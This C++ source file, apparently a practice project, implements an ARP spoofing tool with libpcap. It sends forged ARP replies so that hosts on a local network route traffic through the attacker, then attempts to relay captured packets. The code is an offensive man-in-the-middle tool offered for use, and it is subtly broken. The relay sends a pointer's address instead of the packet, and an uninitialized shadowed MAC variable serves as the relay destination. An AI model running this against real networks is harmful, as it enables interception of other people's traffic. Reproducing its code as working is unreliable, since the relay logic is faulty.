#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "arp-spoof.h"

void usage() {
	printf("arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
	if (argc % 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac attacker_mac, sender_mac, target_mac;
	get_attacker_mac(dev, &attacker_mac);

	Ip attacker_ip;
	get_attacker_ip(dev, &attacker_ip);
	printf("\n");

	for(int i = 2; i < argc; i+=2) {
		Ip sender_ip = Ip(argv[i]);
		Ip target_ip = Ip(argv[i+1]);

		Mac sender_mac = get_sender_mac(handle, attacker_mac, attacker_ip, sender_ip, 0);
		printf("\n");
		Mac target_mac = get_sender_mac(handle, attacker_mac, attacker_ip, target_ip, 1);
		printf("\n");

		
		EthArpPacket* relay_packet;
		while(true) {
			send_arp(handle, sender_mac, attacker_mac, ArpHdr::Reply, attacker_mac, target_ip, sender_mac, sender_ip, true);

			struct pcap_pkthdr* header2;
			const u_char* packet2;

			int res = pcap_next_ex(handle, &header2, &packet2);
			if (res == 0) continue;
			if (res == -1 || res == -2) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthArpPacket* spoofed_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet2));

			if(spoofed_packet->eth_.type_ != htons(EthHdr::Arp)) continue;

			relay_packet = spoofed_packet;
			relay_packet->eth_.smac_ = attacker_mac;
			relay_packet->eth_.dmac_ = target_mac;

			int relay = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relay_packet), sizeof(EthArpPacket));

			if (relay != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", relay, pcap_geterr(handle));
			}
			else {
				printf("send relay packet success\n");
			}
			break;
		}
	}

	pcap_close(handle);
}